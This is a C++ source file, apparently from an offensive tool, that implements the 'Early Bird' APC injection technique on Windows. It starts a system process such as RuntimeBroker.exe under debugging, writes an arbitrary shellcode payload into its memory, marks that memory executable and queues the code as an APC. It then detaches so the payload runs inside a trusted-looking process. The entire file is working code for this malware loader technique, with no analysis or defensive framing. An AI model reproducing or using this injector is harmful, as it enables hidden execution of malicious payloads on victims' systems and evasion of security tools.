#include "core/extract/execution/early_bird.h"
#include "utils/debug_print.h"
#include <sstream>

namespace extract {

namespace early_bird_internal {

// Forward declaration
BOOL HandleDebugEvents(DWORD dwProcessId);

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || 
        sNumberOfBytesWritten != sSizeOfShellcode) {
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }

    return TRUE;
}

// Debug event handling implementation
BOOL HandleDebugEvents(DWORD dwProcessId) {
    DEBUG_EVENT debugEvent = { 0 };
    
    debug::DebugPrint("Starting debug event handling loop");
    while (WaitForDebugEvent(&debugEvent, 100)) {  // Wait with timeout
        if (debugEvent.dwProcessId != dwProcessId) {
            ContinueDebugEvent(debugEvent.dwProcessId, 
                             debugEvent.dwThreadId, 
                             DBG_CONTINUE);
            continue;
        }

        switch (debugEvent.dwDebugEventCode) {
            case EXCEPTION_DEBUG_EVENT:
                debug::DebugPrint("Debug exception event received");
                break;
            case CREATE_PROCESS_DEBUG_EVENT:
                debug::DebugPrint("Process creation debug event");
                CloseHandle(debugEvent.u.CreateProcessInfo.hFile);
                return TRUE;  // Process created successfully
            case EXIT_PROCESS_DEBUG_EVENT:
                debug::DebugPrint("Process exit debug event");
                return FALSE;
            default:
                break;
        }

        ContinueDebugEvent(debugEvent.dwProcessId, 
                         debugEvent.dwThreadId, 
                         DBG_CONTINUE);
    }
    return TRUE;
}

BOOL CreateSuspendedProcess(const char* lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    char lpPath[MAX_PATH];
    STARTUPINFOA Si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION Pi = { 0 };

    sprintf_s(lpPath, MAX_PATH, "%s\\%s", "C:\\Windows\\System32", lpProcessName);
    
    debug::DebugPrint("Creating process: " + std::string(lpPath));

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,  // Use DEBUG_PROCESS for consistent APC delivery
        NULL,
        NULL,
        &Si,
        &Pi)) {
        debug::DebugPrint("Failed to create process, error: " + std::to_string(GetLastError()));
        return FALSE;
    }

    debug::DebugPrint("Process created with ID: " + std::to_string(Pi.dwProcessId));
    
    // Handle initial debug events
    if (!HandleDebugEvents(Pi.dwProcessId)) {
        debug::DebugPrint("Failed to handle debug events");
        TerminateProcess(Pi.hProcess, 1);
        CloseHandle(Pi.hProcess);
        CloseHandle(Pi.hThread);
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    return TRUE;
}

} // namespace early_bird_internal

bool initialize_early_bird_with_routine(
    PAPCFUNC apc_routine,
    ULONG_PTR apc_param,
    HANDLE& out_process,
    HANDLE& out_thread) {
    DWORD process_id = 0;

    // Create suspended process
    if (!early_bird_internal::CreateSuspendedProcess(
        "RuntimeBroker.exe", &process_id, &out_process, &out_thread)) {
        return false;
    }

    // Queue APC routine
    if (QueueUserAPC(apc_routine, out_thread, apc_param) == 0) {
        TerminateProcess(out_process, 1);
        CloseHandle(out_process);
        CloseHandle(out_thread);
        out_process = NULL;
        out_thread = NULL;
        return false;
    }

    return true;
}

bool initialize_early_bird(
    const char* target_process,
    HANDLE& out_process,
    HANDLE& out_thread) {
    DWORD process_id = 0;

    // Create suspended process
    if (!early_bird_internal::CreateSuspendedProcess(
        target_process, &process_id, &out_process, &out_thread)) {
        return false;
    }

    return true;
}

// Global handles for the suspended process
static HANDLE g_hProcess = NULL;
static HANDLE g_hThread = NULL;
static DWORD g_dwProcessId = 0;

void execute_early_bird(const std::vector<unsigned char>& payload, const char* target_process) {
    PVOID pAddress = NULL;

    // Create target process in suspended state
    if (!early_bird_internal::CreateSuspendedProcess(target_process, &g_dwProcessId, &g_hProcess, &g_hThread)) {
        return;
    }

    // Inject shellcode into the process
    if (!early_bird_internal::InjectShellcodeToRemoteProcess(g_hProcess, 
        (PBYTE)payload.data(), payload.size(), &pAddress)) {
        TerminateProcess(g_hProcess, 1);
        CloseHandle(g_hProcess);
        CloseHandle(g_hThread);
        g_hProcess = NULL;
        g_hThread = NULL;
        return;
    }

    // Queue APC to execute shellcode when thread resumes
    if (QueueUserAPC((PAPCFUNC)pAddress, g_hThread, NULL) == 0) {
        TerminateProcess(g_hProcess, 1);
        CloseHandle(g_hProcess);
        CloseHandle(g_hThread);
        g_hProcess = NULL;
        g_hThread = NULL;
        return;
    }

    // Don't resume thread or close handles - keep process suspended
}

void resume_early_bird() {
    if (g_hThread) {
        debug::DebugPrint("Resuming Early Bird execution");
        // For debug process, we need to stop debugging to resume execution
        if (g_dwProcessId) {
            debug::DebugPrint("Stopping debug process with ID: " + std::to_string(g_dwProcessId));
            
            // Handle any remaining debug events before stopping
            early_bird_internal::HandleDebugEvents(g_dwProcessId);
            
            if (!DebugActiveProcessStop(g_dwProcessId)) {
                debug::DebugPrint("Failed to stop debug process, error: " + std::to_string(GetLastError()));
            } else {
                debug::DebugPrint("Debug process stopped successfully");
            }
        }
        CloseHandle(g_hThread);
        g_hThread = NULL;
    }
    if (g_hProcess) {
        CloseHandle(g_hProcess);
        g_hProcess = NULL;
    }
    g_dwProcessId = 0;
}

} // namespace extract